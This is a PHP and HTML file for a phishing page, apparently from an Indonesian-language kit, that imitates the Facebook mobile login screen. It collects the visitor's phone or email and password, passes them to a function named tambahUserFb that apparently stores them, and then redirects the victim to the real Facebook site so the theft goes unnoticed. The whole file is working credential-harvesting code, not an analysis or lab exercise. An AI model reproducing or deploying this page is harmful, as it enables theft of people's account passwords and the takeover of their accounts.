<?php
// require ke function
require 'function.php';

// cek apakan tombol submit sudah ditekan
if (isset($_POST["submit"])) {
  tambahUserFb($_POST);
  sleep(3);
  header("Location: https://m.facebook.com");
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Login | Facebook</title>

  <!-- HTML -->


  <!-- Custom Styles -->
  <link rel="stylesheet" href="assets/css/fb.css">
</head>

<body>
  <center>
    <img class="img" src="assets/img/bg-fb.png" alt="img">
    <span class="lang" href="#">English • Melayu • <a href="">Lainnya...
    </a></span>
    <form action="" method="post">
    <div id="login">
        <input required type="text" placeholder="Telepon atau email" autocomplete="on" name="telepon">
        <input required type="password" placeholder="Kata sandi" name="password">
        <br>
     <button type="submit" name="submit">Masuk</button>
    </div>
    </form>
    <a class="forgot" href="#">Lupa<br>Kata Sandi?</a>
    <hr>
    <p>ATAU</p>
    <button class="creat">Buat Akun Facebook Baru</button>
  </center>
  <script src="assets/js/fb.js"></script>
</body>

</html>